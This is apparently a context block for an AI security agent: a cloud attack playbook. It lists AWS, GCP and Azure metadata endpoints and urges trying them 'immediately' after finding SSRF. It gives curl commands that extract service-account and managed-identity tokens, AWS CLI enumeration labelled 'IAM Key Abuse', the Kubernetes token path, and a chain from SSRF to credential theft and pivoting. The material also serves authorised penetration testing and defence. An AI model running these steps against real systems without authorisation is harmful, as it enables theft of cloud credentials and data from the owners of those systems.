<context_cloud_security>
## Cloud Security Assessment

### Cloud Metadata Endpoints

**AWS**:
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

**GCP**:
```
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google
```

**Azure**:
```
http://169.254.169.254/metadata/instance
Header: Metadata: true
```

### SSRF to Cloud

When you find SSRF, immediately try:
1. Cloud metadata endpoints
2. Internal services (127.0.0.1, 10.x, 192.168.x)
3. Container services (172.17.x)

### AWS-Specific

**IAM Key Abuse**:
```bash
# Configure keys
aws configure

# Check identity
aws sts get-caller-identity

# List S3 buckets
aws s3 ls

# List EC2 instances
aws ec2 describe-instances

# Check permissions
aws iam list-attached-user-policies --user-name <user>
```

**Common AWS Misconfigs**:
- Public S3 buckets
- Overly permissive IAM roles
- Exposed EC2 metadata
- Hardcoded credentials in Lambda
- Open security groups

### GCP-Specific

**Service Account Abuse**:
```bash
# Get token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Use token
curl -H "Authorization: Bearer <token>" \
  https://www.googleapis.com/storage/v1/b
```

**Common GCP Misconfigs**:
- Public Cloud Storage buckets
- Overly permissive service accounts
- Exposed instance metadata
- Firebase misconfigurations

### Azure-Specific

**Managed Identity Abuse**:
```bash
# Get token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Common Azure Misconfigs**:
- Public blob storage
- Exposed App Service credentials
- Overly permissive RBAC
- Exposed Azure Key Vault

### Container/Kubernetes

**Pod Metadata**:
```
http://169.254.169.254/
Kubernetes API: 10.96.0.1:443
Service account tokens: /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Container Escape Checks**:
- Privileged mode
- Host mount
- Host network
- CAP_SYS_ADMIN

### Cloud Attack Chain

```
1. Find SSRF vulnerability
        ↓
2. Access cloud metadata
        ↓
3. Extract IAM credentials/tokens
        ↓
4. Enumerate cloud permissions
        ↓
5. Access storage, databases, secrets
        ↓
6. Pivot to other cloud resources
```
</context_cloud_security>
